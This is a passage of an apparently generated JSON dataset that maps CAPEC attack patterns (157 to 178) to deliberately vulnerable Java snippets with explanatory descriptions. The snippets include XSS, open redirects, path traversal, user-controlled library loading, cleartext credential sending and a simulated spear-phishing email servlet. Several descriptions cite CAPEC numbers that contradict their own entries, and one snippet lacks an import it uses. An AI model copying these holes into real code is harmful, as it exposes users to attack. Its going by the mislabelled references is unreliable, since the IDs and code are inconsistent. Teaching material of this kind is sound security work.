        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class InsecureTempFileExample {\n    public static void main(String[] args) {\n        try {\n            // Create a temporary file in the system's default temp directory\n            File tempFile = File.createTempFile(\"tempData\", \".txt\");\n\n            // Write sensitive information to the temporary file\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Sensitive Information: User Password = 'password123'\");\n            writer.close();\n\n            // Set insecure permissions (readable by others)\n            Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rw-r--r--\");\n            Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n\n            System.out.println(\"Temporary file created at: \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation and use of an insecure temporary file, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary file, writes sensitive information to it, and sets insecure permissions (readable by others). This example highlights several related CWEs: CWE-377 (Insecure Temporary File), CWE-524 (Use of Cache Containing Sensitive Information), CWE-379 (Creation of Temporary File in Directory with Insecure Permissions), and CWE-378 (Creation of Temporary File With Insecure Permissions). The code represents the risk of storing sensitive information in temporary files with insufficient access controls, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class SniffingAttackExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"username=admin&password=12345\";\n            out.println(\"POST /login HTTP/1.1\");\n            out.println(\"Host: example.com\");\n            out.println(\"Content-Type: application/x-www-form-urlencoded\");\n            out.println(\"Content-Length: \" + sensitiveData.length());\n            out.println();\n            out.println(sensitiveData);\n\n            // Read response (not checking integrity, CWE-924)\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a network communication where sensitive information is transmitted in cleartext, embodying the concept of a Sniffing Attack (CAPEC-156). The code connects to a server (example.com) over an unencrypted channel (HTTP on port 80) and sends sensitive data (username and password) in cleartext. This makes it vulnerable to interception by an unauthorized actor who can sniff the network traffic. The code also does not ensure message integrity during transmission (CWE-924), making it susceptible to tampering. This example highlights the importance of encrypting sensitive data (CWE-311) and ensuring message integrity to protect against sniffing attacks."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.Socket;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        String sensitiveData = \"username=admin&password=secret\";\n        try {\n            Socket socket = new Socket(\"example.com\", 80);\n            OutputStream outputStream = socket.getOutputStream();\n            String httpRequest = \"POST /login HTTP/1.1\\r\\n\" +\n                                 \"Host: example.com\\r\\n\" +\n                                 \"Content-Type: application/x-www-form-urlencoded\\r\\n\" +\n                                 \"Content-Length: \" + sensitiveData.length() + \"\\r\\n\" +\n                                 \"\\r\\n\" +\n                                 sensitiveData;\n            outputStream.write(httpRequest.getBytes());\n            outputStream.flush();\n            outputStream.close();\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client application that sends sensitive information (username and password) over a network in cleartext. The code creates a socket connection to a server (example.com) and sends an HTTP POST request containing the sensitive data without any encryption. This embodies the CAPEC 'Sniffing Network Traffic' as an adversary can easily capture and analyze the network traffic to obtain the sensitive information. The related CWEs are represented as follows: CWE-311 (Missing Encryption of Sensitive Data) and CWE-319 (Cleartext Transmission of Sensitive Information) are directly demonstrated by the lack of encryption in the transmission. CWE-294 (Authentication Bypass by Capture-replay) is implied as the cleartext transmission could be captured and replayed by an attacker. CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is also relevant as the sensitive data is exposed to potential unauthorized actors."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class LibraryLoader {\n    public static void main(String[] args) {\n        String userSuppliedPath = args[0]; // CWE-73: External Control of File Name or Path\n        loadLibrary(userSuppliedPath);\n    }\n\n    public static void loadLibrary(String path) {\n        try {\n            // CWE-427: Uncontrolled Search Path Element\n            System.load(path);\n        } catch (UnsatisfiedLinkError e) {\n            System.err.println(\"Failed to load library: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a library from a user-supplied path. The main idea of the CAPEC is represented by allowing an adversary to redirect the application's attempt to access a library to a potentially malicious one. The code takes a path from user input (CWE-73) and uses it to load a library (CWE-427). This can lead to the execution of unauthorized code if the path points to a malicious library. The code is concise and highlights the risk of using untrusted search paths and external control of file names or paths."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String script = request.getParameter(\"script\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<script>\" + script + \"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is directly embedded into a web page without proper validation or neutralization. The 'script' parameter from the HTTP request is included in a <script> tag within the HTML response. This can lead to Cross-Site Scripting (XSS) attacks, as malicious users can inject harmful scripts. This example embodies the CAPEC concept of exploiting script-based APIs and highlights related CWEs such as CWE-79 (Cross-site Scripting) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page)."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableNetworkCommunication {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/login\"; // CWE-941: Incorrectly Specified Destination\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            // No validation of the endpoint's identity\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuffer response = new StringBuffer();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // CWE-924: Improper Enforcement of Message Integrity During Transmission\n                // No integrity check on the received message\n\n                System.out.println(\"Response: \" + response.toString());\n            } else {\n                System.out.println(\"GET request failed\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable network communication scenario where an attacker can manipulate the infrastructure to intercept or redirect network messages. The code attempts to connect to a specified URL (CWE-941: Incorrectly Specified Destination) without validating the endpoint's identity (CWE-923: Improper Restriction of Communication Channel to Intended Endpoints). Additionally, it does not enforce message integrity during transmission (CWE-924: Improper Enforcement of Message Integrity During Transmission). This lack of proper validation and integrity checks can lead to sensitive information being exposed to unauthorized entities, embodying the main idea of the CAPEC 'Infrastructure Manipulation'."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/purchase\")\npublic class PurchaseServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Vulnerable code: trusting client-side hidden fields\n        String itemId = request.getParameter(\"itemId\");\n        String itemPrice = request.getParameter(\"itemPrice\"); // Hidden field\n        String quantity = request.getParameter(\"quantity\");\n\n        // Calculate total price based on client-provided data\n        double totalPrice = Double.parseDouble(itemPrice) * Integer.parseInt(quantity);\n\n        // Process the purchase\n        processPurchase(itemId, totalPrice);\n\n        response.getWriter().write(\"Purchase successful. Total price: \" + totalPrice);\n    }\n\n    private void processPurchase(String itemId, double totalPrice) {\n        // Simulate purchase processing\n        System.out.println(\"Processing purchase for item \" + itemId + \" with total price \" + totalPrice);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where the server trusts client-side hidden fields for critical information such as item price. The 'itemPrice' parameter is taken directly from the client-side form, which can be manipulated by an attacker to alter the price of an item. This embodies the CAPEC of 'Manipulating Hidden Fields' and is related to several CWEs: CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-472 (External Control of Assumed-Immutable Web Parameter). The code calculates the total price based on the client-provided price and quantity, which can be exploited to perform eShoplifting by modifying the hidden 'itemPrice' field."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/redirect\")\npublic class OpenRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(targetUrl);\n        } else {\n            response.getWriter().write(\"Invalid URL\");\n        }\n    }\n}\n\n@WebServlet(\"/phishingEmail\")\npublic class PhishingEmailServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String emailContent = request.getParameter(\"emailContent\");\n        String targetEmail = request.getParameter(\"targetEmail\");\n        if (emailContent != null && targetEmail != null) {\n            // Simulate sending a phishing email\n            sendPhishingEmail(targetEmail, emailContent);\n            response.getWriter().write(\"Phishing email sent to \" + targetEmail);\n        } else {\n            response.getWriter().write(\"Invalid email content or target email\");\n        }\n    }\n\n    private void sendPhishingEmail(String targetEmail, String emailContent) {\n        // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        // CWE-1022: Use of Web Link to Untrusted Target with window.opener Access\n        String phishingLink = \"http://malicious-site.com?target=\" + targetEmail;\n        String fullEmailContent = emailContent + \"\\nClick here: \" + phishingLink;\n        // Simulate sending email (details omitted)\n        System.out.println(\"Sending email to \" + targetEmail + \": \" + fullEmailContent);\n    }\n}",
        "description": "This Java code snippet demonstrates a web application that embodies the main idea of a Spear Phishing attack (CAPEC-163) using related CWEs for context. The `OpenRedirectServlet` class contains a vulnerability (CWE-601) where user-controlled input is used to redirect to an untrusted site, facilitating phishing attacks. The `PhishingEmailServlet` class simulates sending a phishing email to a targeted user, incorporating CWE-451 and CWE-1022 by misrepresenting critical information in the email content and including a malicious link that could exploit the window.opener property. This code highlights how an attacker might craft a spear phishing attack by leveraging these vulnerabilities."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class MobilePhishingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"You have received a new message: 'Your account has been compromised. Please visit http://fakebank.com to secure your account.'\");\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        // Simulate sending credentials to a phishing site\n        sendCredentialsToPhishingSite(username, password);\n        System.out.println(\"Your account has been secured.\");\n    }\n\n    private static void sendCredentialsToPhishingSite(String username, String password) {\n        // This method simulates sending the credentials to a malicious site\n        System.out.println(\"Sending credentials to phishing site...\");\n        // In a real attack, this would send the data to an attacker's server\n    }\n}",
        "description": "This Java code snippet simulates a mobile phishing attack where a user receives a deceptive message prompting them to visit a fake website and enter their credentials. The code demonstrates how an attacker might solicit sensitive information from a user by misrepresenting critical information (CWE-451) and exploiting weak authentication mechanisms (CWE-290, CWE-307, CWE-309, CWE-308). The user is tricked into providing their username and password, which are then 'sent' to a phishing site, illustrating the core concept of a mobile phishing attack."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import java.io.*;\n\npublic class FileManipulationExample {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java FileManipulationExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        File file = new File(filename);\n\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of file manipulation vulnerability. The program takes a filename as a command-line argument and reads the file's contents, printing each line to the console. The vulnerability lies in the fact that the filename is taken directly from user input without any validation or sanitization. This can lead to several issues described in the CAPEC and related CWEs, such as:\n\n1. **External Control of File Name or Path (CWE-73)**: The user can specify any file path, potentially accessing sensitive files.\n2. **Reliance on File Name or Extension of Externally-Supplied File (CWE-646)**: The program assumes the file is safe to read based on its name, which could be misleading.\n3. **Improper Control of Resource Identifiers (CWE-99)**: The filename is used directly without restrictions, allowing for resource injection.\n4. **Insecure Temporary File (CWE-377)**: Although not directly shown, if the file were a temporary file, it could be insecurely handled.\n5. **Path Traversal (CWE-22)**: The lack of validation allows for path traversal attacks, where an attacker could access files outside the intended directory structure.\n\nThis code represents the main idea of the CAPEC by showing how improper handling of file names and paths can lead to vulnerabilities that attackers can exploit to manipulate file contents or attributes, causing incorrect processing by the application."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "public class SystemResetExample {\n    private static boolean isAuthenticated = false;\n    private static int securitySetting = 1; // 1 means secure, 0 means insecure\n\n    public static void main(String[] args) {\n        // Simulate a power state transition\n        powerStateTransition();\n\n        // Attempt to reset system values\n        resetSystemValues();\n\n        // Check security setting after reset\n        if (securitySetting == 0) {\n            System.out.println(\"Security setting is insecure after reset!\");\n        } else {\n            System.out.println(\"Security setting is secure.\");\n        }\n    }\n\n    private static void powerStateTransition() {\n        // Simulate entering a low power state and waking up\n        System.out.println(\"Entering low power state...\");\n        System.out.println(\"Waking up from low power state...\");\n        // Improperly preserved integrity of hardware configuration state\n        securitySetting = 0; // Security setting becomes insecure after power state transition\n    }\n\n    private static void resetSystemValues() {\n        if (!isAuthenticated) {\n            // Missing authentication for critical function\n            System.out.println(\"Resetting system values without authentication...\");\n            securitySetting = 0; // Reset security setting to insecure value\n        } else {\n            System.out.println(\"Authenticated user. No reset performed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can force the system to reset values, leveraging potential weaknesses in the target's configuration. The code simulates a power state transition that improperly preserves the integrity of the hardware configuration state, setting a security-critical setting to an insecure value. Additionally, the resetSystemValues method allows resetting critical system values without proper authentication, highlighting the vulnerability of missing authentication for critical functions. This embodies the main idea of the CAPEC 'Force the System to Reset Values' and incorporates related CWEs such as 'Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation' and 'Missing Authentication for Critical Function'."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataLogger {\n    private static final String TRACE_FILE = \"/tmp/trace.log\";\n\n    public static void main(String[] args) {\n        try {\n            // Simulate sensitive trace data collection\n            String sensitiveData = collectSensitiveData();\n            // Log sensitive data to an unprotected file\n            logSensitiveData(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String collectSensitiveData() {\n        // Simulate collection of sensitive data\n        return \"Sensitive system information: [REDACTED]\";\n    }\n\n    private static void logSensitiveData(String data) throws IOException {\n        FileWriter writer = new FileWriter(new File(TRACE_FILE));\n        writer.write(data);\n        writer.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive trace data is collected and logged to an unprotected file. The `collectSensitiveData` method simulates the collection of sensitive system information, and the `logSensitiveData` method writes this data to a file located at `/tmp/trace.log`. This embodies the main idea of CAPEC-White Box Reverse Engineering by exposing sensitive system information through improper management of trace data (CWE-1323) and exposure of sensitive system information to unauthorized control spheres (CWE-497). An attacker with access to the file system could easily access the sensitive data, leading to potential security breaches."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class ADSExample {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        String adsPath = filePath + \":hiddenStream\";\n        String data = \"Sensitive data hidden in ADS\";\n\n        try {\n            // Create the main file\n            File file = new File(filePath);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Write data to the alternate data stream\n            FileOutputStream fos = new FileOutputStream(adsPath);\n            fos.write(data.getBytes());\n            fos.close();\n\n            System.out.println(\"Data written to ADS\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how to create and write to an Alternate Data Stream (ADS) in a Windows NTFS file system. The main file 'example.txt' is created, and then sensitive data is written to an ADS named 'hiddenStream' associated with this file. This technique can be used by attackers to hide malicious data or tools within a file, making it difficult for standard file utilities and some antivirus programs to detect. The code embodies the main idea of CAPEC-212 by showing how sensitive information can be improperly stored in an ADS, which is not typically visible or checked by standard security measures. The related CWEs highlight the potential security weaknesses, such as improper handling of ADS (CWE-69) and improper removal of sensitive information (CWE-212)."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class FootprintingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            int responseCode = conn.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuffer response = new StringBuffer();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                System.out.println(\"Response: \" + response.toString());\n\n                // CWE-222: Truncation of Security-relevant Information\n                if (response.length() > 100) {\n                    System.out.println(\"Truncated Response: \" + response.substring(0, 100));\n                }\n            }\n        } catch (Exception e) {\n            // CWE-205: Observable Behavioral Discrepancy\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple HTTP GET request to a specified URL, which embodies the concept of 'Footprinting' by probing and exploring the target. The code includes potential vulnerabilities related to the CAPEC and CWEs: \n1. CWE-200: The response from the server is printed directly, potentially exposing sensitive information to unauthorized actors.\n2. CWE-222: The response is truncated if it exceeds 100 characters, which could obscure important security-relevant information.\n3. CWE-205: Any errors encountered during the request are printed, which could reveal discrepancies in behavior that an attacker could observe and exploit."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class WebAppFingerprinting {\n    public static void main(String[] args) {\n        String targetUrl = \"http://example.com\";\n        try {\n            HttpURLConnection connection = (HttpURLConnection) new URL(targetUrl).openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n\n            int responseCode = connection.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            if (responseCode == 404) {\n                System.out.println(\"Error: Page not found\");\n            }\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String serverInfo = connection.getHeaderField(\"Server\");\n            System.out.println(\"Server Info: \" + serverInfo);\n\n            // CWE-598: Use of GET Request Method With Sensitive Query Strings\n            URL sensitiveUrl = new URL(targetUrl + \"?password=secret\");\n            HttpURLConnection sensitiveConnection = (HttpURLConnection) sensitiveUrl.openConnection();\n            sensitiveConnection.setRequestMethod(\"GET\");\n            sensitiveConnection.connect();\n            System.out.println(\"Sensitive Response Code: \" + sensitiveConnection.getResponseCode());\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates web application fingerprinting by sending HTTP GET requests to a target URL and extracting version-dependent and type-dependent information. The code includes several vulnerabilities: \n1. CWE-209: It prints error messages that may contain sensitive information.\n2. CWE-497: It exposes sensitive system information (e.g., server type) through HTTP headers.\n3. CWE-598: It uses the GET method with sensitive query strings, potentially exposing sensitive information in URLs.\nThe code represents the main idea of CAPEC-170 by showing how an attacker might gather information about a web application to plan further attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter variable name: \");\n        String varName = scanner.nextLine();\n        System.out.print(\"Enter value: \");\n        String value = scanner.nextLine();\n\n        // Dynamic variable evaluation\n        try {\n            eval(varName + \" = '\" + value + \"'\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Simulated eval function\n    public static void eval(String code) throws Exception {\n        // This is a placeholder for actual dynamic code execution\n        System.out.println(\"Executing: \" + code);\n        // In a real scenario, this could be a security risk\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to dynamic variable manipulation and evaluation. The code takes user input to define a variable name and its value, then attempts to dynamically evaluate this input using a simulated 'eval' function. This represents CWE-95 (Eval Injection) and CWE-627 (Dynamic Variable Evaluation), where user-controlled input is used in dynamic code execution, posing a significant security risk. The 'eval' function here is a placeholder to illustrate the concept, but in a real-world scenario, such dynamic evaluation could lead to arbitrary code execution or manipulation of unintended variables."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import javax.swing.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class ActionSpoofingExample {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Action Spoofing Example\");\n        JButton button = new JButton(\"Submit Query\");\n\n        // Misleading button action\n        button.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                // User thinks this submits a query, but it actually downloads a file\n                downloadFile();\n            }\n        });\n\n        frame.getContentPane().add(button);\n        frame.setSize(300, 200);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setVisible(true);\n    }\n\n    private static void downloadFile() {\n        // Simulate file download\n        System.out.println(\"Downloading file...\");\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Action Spoofing, where a button labeled 'Submit Query' misleads the user into thinking it will submit a query. However, when clicked, it actually triggers a file download. This embodies the main idea of CAPEC-139 (Action Spoofing) by disguising one action (file download) as another (query submission). The code also touches on CWE-451 (UI Misrepresentation of Critical Information) as the button's label misrepresents its true function, potentially leading to user confusion and unintended actions."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashParameterInjection extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashParam = request.getParameter(\"flashParam\");\n        String htmlContent = \"<html><body>\" +\n                \"<embed src='movie.swf' FlashVars='\" + flashParam + \"'></embed>\" +\n                \"</body></html>\";\n        response.setContentType(\"text/html\");\n        response.getWriter().write(htmlContent);\n    }\n}\n",
        "description": "This Java servlet code demonstrates a Flash Parameter Injection vulnerability. The code takes a user-supplied parameter 'flashParam' from the HTTP request and directly embeds it into the HTML content without proper validation or sanitization. This allows an attacker to inject malicious global parameters into the Flash file embedded within the HTML document. The code snippet also touches on related CWEs: improper neutralization of special elements (CWE-1336) and unrestricted upload of dangerous types (CWE-434), as the user input is not sanitized and could include harmful content."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCodeInclusion {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableCodeInclusion <url>\");\n            return;\n        }\n\n        String url = args[0];\n        try {\n            URL website = new URL(url);\n            BufferedReader in = new BufferedReader(new InputStreamReader(website.openStream()));\n            StringBuilder code = new StringBuilder();\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine).append(\"\\n\");\n            }\n            in.close();\n\n            // Simulate code execution\n            System.out.println(\"Executing code from: \" + url);\n            System.out.println(code.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Code Inclusion' (CAPEC-242). The program takes a URL as an argument, retrieves the content from the specified URL, and simulates the execution of the retrieved code. This embodies CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it imports executable functionality from an external source. The code does not validate or sanitize the input URL, making it susceptible to CWE-98 (PHP Remote File Inclusion) and CWE-94 (Code Injection). The retrieved code could potentially contain malicious instructions, representing CWE-506 (Embedded Malicious Code). This example highlights the risks of dynamically including and executing code from untrusted sources."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class ConfigManipulator {\n    private Properties config;\n\n    public ConfigManipulator(String configFilePath) throws IOException {\n        config = new Properties();\n        try (FileInputStream input = new FileInputStream(configFilePath)) {\n            config.load(input);\n        }\n    }\n\n    public void setConfig(String key, String value) {\n        config.setProperty(key, value);\n    }\n\n    public String getConfig(String key) {\n        return config.getProperty(key);\n    }\n\n    public void saveConfig(String configFilePath) throws IOException {\n        try (FileOutputStream output = new FileOutputStream(configFilePath)) {\n            config.store(output, null);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManipulator manipulator = new ConfigManipulator(\"config.properties\");\n            manipulator.setConfig(\"debugMode\", \"true\");\n            manipulator.saveConfig(\"config.properties\");\n            System.out.println(\"Configuration updated.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple configuration manipulation scenario. The `ConfigManipulator` class loads configuration settings from an external file (`config.properties`), allows modification of these settings, and saves the updated settings back to the file. This embodies the CAPEC concept of 'Configuration/Environment Manipulation' by showing how an attacker could potentially modify configuration settings that affect the application's behavior. The code does not include any security measures to prevent unauthorized changes, making it vulnerable to CWE-15 (External Control of System or Configuration Setting)."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableFileLoader {\n    public static void main(String[] args) {\n        String fileName = \"config.properties\";\n        File file = new File(fileName);\n        try (FileInputStream fis = new FileInputStream(file)) {\n            // Load the file\n            System.out.println(\"File loaded: \" + file.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a file based solely on its name, without considering the file's location or verifying its integrity. The code attempts to load a file named 'config.properties' from the current working directory. An attacker could exploit this by placing a malicious 'config.properties' file in the directory where the application is running, causing the application to load the attacker's file instead of the legitimate one. This embodies the main idea of the CAPEC by showing how an attacker can create a file with the same name as a protected file, leading to potential manipulation of the system. The related CWEs highlight the risks of using incorrectly-resolved names or references, external control of file names or paths, and reliance on file names or extensions."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class FlashRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String targetUrl = request.getParameter(\"targetUrl\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(targetUrl);\n        } else {\n            response.getWriter().write(\"No target URL provided.\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation that embodies the main idea of the CAPEC 'Cross-Site Flashing'. The servlet takes a 'targetUrl' parameter from the HTTP request and redirects the user to that URL without any validation. This represents CWE-601 (URL Redirection to Untrusted Site), which can be exploited by an attacker to redirect users to malicious sites. The code snippet is vulnerable because it allows an attacker to control the 'targetUrl' parameter, potentially leading to phishing attacks or other malicious activities. This example highlights the risk of allowing user-controlled input to dictate redirection targets, a common issue in web applications that can be exploited in the context of Flash-based attacks."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
